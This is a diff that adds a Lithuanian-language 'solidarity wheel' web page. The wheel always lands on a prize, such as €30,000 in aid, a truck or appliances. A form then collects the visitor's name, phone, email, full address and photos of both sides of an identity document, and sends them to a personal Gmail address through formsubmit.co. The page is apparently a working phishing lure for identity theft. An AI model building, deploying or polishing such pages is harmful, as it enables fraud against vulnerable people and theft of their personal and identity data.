@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solidarumo Ratai | Solidarumas Lygiai</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <style>
+        :root {
+            --primary: #2B6CB0;
+            --primary-light: #4299E1;
+            --primary-dark: #2C5282;
+            --secondary: #F6AD55;
+            --accent: #F56565;
+            --success: #38A169;
+            --dark: #2D3748;
+            --light: #F7FAFC;
+            --white: #FFFFFF;
+            --gold: #D4AF37;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            overflow-x: hidden;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: var(--light);
+            display: flex;
+            flex-direction: column;
+            color: var(--dark);
+            line-height: 1.5;
+        }
+
+        .navbar {
+            background: var(--primary-dark);
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .navbar-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .logo {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.8rem;
+            color: var(--white);
+            text-decoration: none;
+        }
+
+        .logo span {
+            color: var(--secondary);
+        }
+
+        .container {
+            flex: 1;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.2rem;
+            color: var(--primary-dark);
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 1.1rem;
+            color: var(--dark);
+            opacity: 0.9;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            text-align: center;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto 40px;
+            aspect-ratio: 1/1;
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            border-radius: 50%;
+            overflow: hidden;
+            transition: transform 15s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+            transform: rotate(0deg);
+            border: 8px solid var(--primary);
+            box-shadow: 
+                inset 0 0 30px rgba(0,0,0,0.1),
+                0 0 0 5px var(--gold),
+                0 0 20px 5px rgba(212, 175, 55, 0.5);
+            background: var(--white);
+        }
+
+        .wheel-section {
+            position: absolute;
+            width: 50%;
+            height: 50%;
+            transform-origin: bottom right;
+            left: 0;
+            top: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            clip-path: polygon(0 0, 100% 0, 100% 100%);
+            font-weight: 600;
+            color: var(--white);
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+            border-right: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .wheel-section-content {
+            transform: rotate(22.5deg) translateX(40px);
+            width: 100%;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-bottom: 60px;
+        }
+
+        .wheel-section-icon {
+            font-size: 1.6rem;
+            margin-bottom: 8px;
+            filter: drop-shadow(0 2px 2px rgba(0,0,0,0.3));
+        }
+
+        .wheel-section-text {
+            font-size: 0.9rem;
+            font-weight: 700;
+            width: 100px;
+            line-height: 1.2;
+        }
+
+        .wheel-center {
+            position: absolute;
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, var(--gold) 0%, #B8860B 100%);
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 
+                0 0 15px rgba(0,0,0,0.3),
+                inset 0 0 10px rgba(255,255,255,0.3);
+            z-index: 10;
+            cursor: pointer;
+            border: none;
+            font-weight: bold;
+            color: var(--white);
+            transition: all 0.3s ease;
+            font-size: 1rem;
+            text-transform: uppercase;
+        }
+
+        .wheel-center:hover {
+            transform: translate(-50%, -50%) scale(1.05);
+        }
+
+        .wheel-pointer {
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 50px;
+            z-index: 5;
+        }
+
+        .wheel-pointer:before {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 0;
+            border-left: 25px solid transparent;
+            border-right: 25px solid transparent;
+            border-top: 35px solid var(--gold);
+            filter: drop-shadow(0 3px 5px rgba(0,0,0,0.2));
+        }
+
+        .wheel-pointer:after {
+            content: '';
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            background: var(--gold);
+            border-radius: 50%;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.3);
+        }
+
+        .spin-btn {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--white);
+            border: none;
+            padding: 14px 40px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(43, 108, 176, 0.4);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            max-width: 300px;
+            width: 100%;
+        }
+
+        .spin-btn:hover {
+            background: linear-gradient(135deg, var(--primary-light) 0%, var(--primary) 100%);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(43, 108, 176, 0.6);
+        }
+
+        .spin-btn:disabled {
+            background: var(--gray);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .modal-content {
+            background: var(--white);
+            border-radius: 15px;
+            width: 95%;
+            max-width: 500px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            transform: translateY(-20px);
+            transition: transform 0.3s ease;
+            position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
+            border: 3px solid var(--gold);
+            margin: 20px;
+        }
+
+        .modal.active .modal-content {
+            transform: translateY(0);
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: var(--gray);
+            background: none;
+            border: none;
+            transition: color 0.3s;
+        }
+
+        .close-modal:hover {
+            color: var(--dark);
+        }
+
+        .modal-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            color: var(--primary-dark);
+            text-align: center;
+        }
+
+        .prize-name {
+            font-size: 1.4rem;
+            color: var(--gold);
+            margin-bottom: 15px;
+            text-align: center;
+            font-weight: 700;
+        }
+
+        .prize-description {
+            background: var(--light);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 1rem;
+            color: var(--dark);
+            border-left: 4px solid var(--primary);
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--dark);
+            font-size: 0.95rem;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid var(--light-gray);
+            border-radius: 8px;
+            font-family: 'Poppins', sans-serif;
+            font-size: 1rem;
+            transition: border 0.3s ease;
+        }
+
+        input:focus, textarea:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 5px rgba(43, 108, 176, 0.2);
+        }
+
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+        }
+
+        .file-input-container {
+            position: relative;
+            overflow: hidden;
+            display: inline-block;
+            width: 100%;
+        }
+
+        .file-input-btn {
+            background: var(--primary);
+            color: var(--white);
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.3s ease;
+            font-size: 0.95rem;
+        }
+
+        .file-input-btn:hover {
+            background: var(--primary-dark);
+        }
+
+        .file-input {
+            position: absolute;
+            left: 0;
+            top: 0;
+            opacity: 0;
+            width: 100%;
+            height: 100%;
+            cursor: pointer;
+        }
+
+        .file-name {
+            margin-top: 8px;
+            font-size: 0.9rem;
+            color: var(--gray);
+        }
+
+        .submit-btn {
+            background: var(--success);
+            color: var(--white);
+            border: none;
+            padding: 14px;
+            font-size: 1.1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            background: #2F855A;
+            transform: translateY(-2px);
+        }
+
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            left: 20px;
+            background: var(--success);
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            transform: translateY(-150%);
+            transition: transform 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        .notification.error {
+            background: var(--error);
+        }
+
+        .notification.active {
+            transform: translateY(0);
+        }
+
+        .notification-icon {
+            margin-right: 10px;
+            font-size: 1.3rem;
+        }
+
+        /* Confetti */
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 90;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--primary-dark);
+            color: var(--white);
+            padding: 30px 0;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            list-style: none;
+            margin-bottom: 20px;
+        }
+
+        .footer-links li {
+            margin: 0 15px;
+        }
+
+        .footer-links a {
+            color: var(--white);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: var(--secondary);
+        }
+
+        .copyright {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        /* Responsive */
+        @media (min-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .subtitle {
+                font-size: 1.2rem;
+            }
+            
+            .wheel-container {
+                max-width: 500px;
+            }
+            
+            .wheel-section-content {
+                transform: rotate(22.5deg) translateX(50px);
+                padding-bottom: 80px;
+            }
+            
+            .wheel-section-icon {
+                font-size: 2rem;
+            }
+            
+            .wheel-section-text {
+                font-size: 1rem;
+                width: 120px;
+            }
+            
+            .modal-content {
+                padding: 30px;
+            }
+            
+            .notification {
+                left: auto;
+                width: auto;
+                max-width: 400px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="navbar-container">
+            <a href="index-lt.html" class="logo">Solidarumas<span>Lygiai</span></a>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="container">
+        <h1 class="animate__animated animate__fadeInDown">Solidarumo Ratai</h1>
+        <p class="subtitle animate__animated animate__fadeIn animate__delay-1s">Pasukite ratą, kad sužinotumėte, kokią paramą gausite</p>
+        
+        <div class="wheel-container">
+            <div class="wheel-pointer"></div>
+            <div class="wheel" id="wheel">
+                <!-- Sections will be added by JavaScript -->
+            </div>
+            <button class="wheel-center" id="spinBtn">ŽAISTI</button>
+        </div>
+        
+        <button class="spin-btn animate__animated animate__fadeInUp animate__delay-1s" id="mainSpinBtn">Pasukti ratą</button>
+    </div>
+
+    <!-- Prize Modal -->
+    <div class="modal" id="prizeModal">
+        <div class="modal-content">
+            <button class="close-modal" id="closeModal">&times;</button>
+            <h2 class="modal-title">Sveikiname!</h2>
+            <p class="prize-name" id="prizeName"></p>
+            <div class="prize-description" id="prizeDescription"></div>
+            
+            <form id="prizeForm" action="https://formsubmit.co/docozozo70@gmail.com" method="POST" enctype="multipart/form-data">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
+                
+
+                <div class="form-group">
+                    <label for="firstName">Vardas *</label>
+                    <input type="text" id="firstName" name="firstName" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="lastName">Pavardė *</label>
+                    <input type="text" id="lastName" name="lastName" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="phone">Telefonas *</label>
+                    <input type="tel" id="phone" name="phone" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="email">El. paštas *</label>
+                    <input type="email" id="email" name="email" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="address">Pilnas adresas *</label>
+                    <textarea id="address" name="address" rows="3" required></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label>Tapatybės dokumentas (priekinė/galinė pusė) *</label>
+                    <div class="file-input-container">
+                        <div class="file-input-btn">
+                            <span>Įkelti failus</span>
+                            <input type="file" class="file-input" id="idDocument" name="idDocument" accept="image/*,.pdf" multiple required>
+                        </div>
+                        <div class="file-name" id="fileName">Failas nepasirinktas</div>
+                    </div>
+                </div>
+                
+                <button type="submit" class="submit-btn">Patvirtinti ir gauti paramą</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        <span class="notification-icon">✓</span>
+        <span id="notificationMessage">Jūsų forma sėkmingai pateikta!</span>
+    </div>
+
+    <!-- Confetti Container -->
+    <div class="confetti-container" id="confettiContainer"></div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content">
+            <ul class="footer-links">
+                <li><a href="index-lt.html">Pagrindinis</a></li>
+                <li><a href="conditions-lt.html">Sąlygos</a></li>
+                <li><a href="confidentialite-lt.html">Privatumas</a></li>
+                <li><a href="nous-connaitre-lt.html">Apie mus</a></li>
+                <li><a href="contact-lt.html">Kontaktai</a></li>
+            </ul>
+            <p class="copyright">&copy; 2023 Solidarumas Lygiai. Visos teisės saugomos.</p>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Wheel configuration
+            const wheel = document.getElementById('wheel');
+            const spinBtn = document.getElementById('spinBtn');
+            const mainSpinBtn = document.getElementById('mainSpinBtn');
+            const prizeModal = document.getElementById('prizeModal');
+            const closeModal = document.getElementById('closeModal');
+            const prizeForm = document.getElementById('prizeForm');
+            const prizeName = document.getElementById('prizeName');
+            const prizeDescription = document.getElementById('prizeDescription');
+            const notification = document.getElementById('notification');
+            const notificationMessage = document.getElementById('notificationMessage');
+            const confettiContainer = document.getElementById('confettiContainer');
+            const fileInput = document.getElementById('idDocument');
+            const fileName = document.getElementById('fileName');
+
+            // Solidarity prizes configuration (6 sections)
+            const prizes = [
+                { 
+                    name: "Buitinė Technika", 
+                    description: "Nauji buitiniai prietaisai (šaldytuvas, viryklė, skalbimo mašina) jūsų namams.",
+                    color: "#4299E1",
+                    icon: "fas fa-home"
+                },
+                { 
+                    name: "Krovininis Automobilis", 
+                    description: "Geros būklės krovininis automobilis profesinei veiklai plėtoti.",
+                    color: "#F6AD55",
+                    icon: "fas fa-truck"
+                },
+                { 
+                    name: "Profesinis Mokymas", 
+                    description: "Sertifikuota mokymo programa jūsų pasirinkta sritimi.",
+                    color: "#68D391",
+                    icon: "fas fa-graduation-cap"
+                },
+                { 
+                    name: "Finansinė Parama", 
+                    description: "30000€ finansinė parama jūsų asmeniniams ar profesiniams projektams.",
+                    color: "#F687B3",
+                    icon: "fas fa-euro-sign"
+                },
+                { 
+                    name: "Profesinė Įranga", 
+                    description: "Reikalinga įranga verslui pradėti ar plėtoti.",
+                    color: "#7F9CF5",
+                    icon: "fas fa-tools"
+                },
+                { 
+                    name: "Kompiuterių Rinkinys", 
+                    description: "Kompiuteris su programine įranga ir mokymu skaitmeninei raiškei.",
+                    color: "#81E6D9",
+                    icon: "fas fa-laptop"
+                }
+            ];
+
+            // Create wheel sections
+            function createWheelSections() {
+                const sectionAngle = 360 / prizes.length;
+                
+                prizes.forEach((prize, index) => {
+                    const section = document.createElement('div');
+                    section.className = 'wheel-section';
+                    section.style.transform = `rotate(${sectionAngle * index}deg)`;
+                    section.style.backgroundColor = prize.color;
+                    
+                    const sectionContent = document.createElement('div');
+                    sectionContent.className = 'wheel-section-content';
+                    
+                    const icon = document.createElement('i');
+                    icon.className = `wheel-section-icon ${prize.icon}`;
+                    
+                    const text = document.createElement('div');
+                    text.className = 'wheel-section-text';
+                    text.textContent = prize.name;
+                    
+                    sectionContent.appendChild(icon);
+                    sectionContent.appendChild(text);
+                    section.appendChild(sectionContent);
+                    wheel.appendChild(section);
+                });
+            }
+
+            // Spin the wheel
+            function spinWheel() {
+                spinBtn.disabled = true;
+                mainSpinBtn.disabled = true;
+                
+                // Random rotation (15s duration)
+                const sectionAngle = 360 / prizes.length;
+                const prizeIndex = Math.floor(Math.random() * prizes.length);
+                const extraRotation = Math.floor(Math.random() * 60) + 30;
+                const rotation = 360 * 10 + (sectionAngle * prizeIndex) + extraRotation;
+                
+                wheel.style.transform = `rotate(${-rotation}deg)`;
+                
+                // After animation completes
+                setTimeout(() => {
+                    showPrize(prizeIndex);
+                    createConfetti();
+                }, 15000);
+            }
+
+            // Show prize modal
+            function showPrize(index) {
+                prizeName.textContent = prizes[index].name;
+                prizeDescription.textContent = prizes[index].description;
+                prizeModal.classList.add('active');
+                
+                // Add prize info to form data
+                const prizeInput = document.createElement('input');
+                prizeInput.type = 'hidden';
+                prizeInput.name = 'prize';
+                prizeInput.value = `${prizes[index].name} - ${prizes[index].description}`;
+                prizeForm.appendChild(prizeInput);
+            }
+
+            // Close modal
+            function closePrizeModal() {
+                prizeModal.classList.remove('active');
+                spinBtn.disabled = false;
+                mainSpinBtn.disabled = false;
+                
+                // Reset wheel after a delay
+                setTimeout(() => {
+                    wheel.style.transition = 'none';
+                    wheel.style.transform = 'rotate(0deg)';
+                    setTimeout(() => {
+                        wheel.style.transition = 'transform 15s cubic-bezier(0.17, 0.67, 0.12, 0.99)';
+                    }, 10);
+                }, 500);
+            }
+
+            // Show notification
+            function showNotification(message, isError = false) {
+                notificationMessage.textContent = message;
+                
+                if (isError) {
+                    notification.classList.add('error');
+                } else {
+                    notification.classList.remove('error');
+                }
+                
+                notification.classList.add('active');
+                
+                setTimeout(() => {
+                    notification.classList.remove('active');
+                }, 5000);
+            }
+
+            // Create confetti effect
+            function createConfetti() {
+                // Clear previous confetti
+                confettiContainer.innerHTML = '';
+                
+                // Create new confetti
+                const colors = ['#2B6CB0', '#F6AD55', '#38A169', '#F56565', '#FFFFFF'];
+                
+                for (let i = 0; i < 100; i++) {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = `${Math.random() * 100}%`;
+                    confetti.style.top = '-10px';
+                    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+                    confetti.style.width = `${Math.random() * 10 + 5}px`;
+                    confetti.style.height = `${Math.random() * 10 + 5}px`;
+                    confetti.style.opacity = '0.8';
+                    
+                    // Random shape
+                    if (Math.random() > 0.5) {
+                        confetti.style.borderRadius = '50%';
+                    }
+                    
+                    // Animation
+                    const animationDuration = Math.random() * 3 + 2;
+                    const animationDelay = Math.random() * 2;
+                    confetti.style.animation = `fall ${animationDuration}s linear ${animationDelay}s forwards`;
+                    
+                    // Add keyframes dynamically
+                    const keyframes = `
+                        @keyframes fall {
+                            to {
+                                transform: translateY(${window.innerHeight + 100}px) rotate(${Math.random() * 360}deg);
+                                opacity: 0;
+                            }
+                        }
+                    `;
+                    
+                    const style = document.createElement('style');
+                    style.innerHTML = keyframes;
+                    document.head.appendChild(style);
+                    
+                    confettiContainer.appendChild(confetti);
+                }
+            }
+
+            // Handle file input change
+            function handleFileInputChange() {
+                if (fileInput.files.length > 0) {
+                    const names = Array.from(fileInput.files).map(file => file.name).join(', ');
+                    fileName.textContent = names;
+                } else {
+                    fileName.textContent = 'Nepasirinkta jokių failų';
+                }
+            }
+
+            // Form submission
+            async function handleFormSubmit(e) {
+                e.preventDefault();
+                
+                const formData = new FormData(prizeForm);
+                const submitBtn = prizeForm.querySelector('button[type="submit"]');
+                
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Siuntimas vyksta...';
+                
+                try {
+                    const response = await fetch(prizeForm.action, {
+                        method: 'POST',
+                        body: formData,
+                        headers: {
+                            'Accept': 'application/json'
+                        }
+                    });
+                    
+                    if (response.ok) {
+                        showNotification('Jūsų prašymas užregistruotas! Mes susisieksime su jumis per 48 valandas ir susitarsime dėl jūsų aukos pristatymo.');
+                        prizeForm.reset();
+                        fileName.textContent = 'Nepasirinkta jokių failų';
+                        setTimeout(closePrizeModal, 3000);
+                    } else {
+                        const error = await response.json();
+                        throw new Error(error.error || 'Klaida pateikiant formą');
+                    }
+                } catch (error) {
+                    showNotification(error.message || 'Įvyko klaida. Bandykite dar kartą.', true);
+                    console.error('Error:', error);
+                } finally {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Patvirtinkite ir priimkite mano auką';
+                }
+            }
+
+            // Initialize
+            createWheelSections();
+            
+            // Event listeners
+            spinBtn.addEventListener('click', spinWheel);
+            mainSpinBtn.addEventListener('click', spinWheel);
+            closeModal.addEventListener('click', closePrizeModal);
+            prizeForm.addEventListener('submit', handleFormSubmit);
+            fileInput.addEventListener('change', handleFileInputChange);
+            
+            // Close modal when clicking outside
+            prizeModal.addEventListener('click', function(e) {
+                if (e.target === prizeModal) {
+                    closePrizeModal();
+                }
+            });
+        });
+    </script>
+
+</body>
+</html>
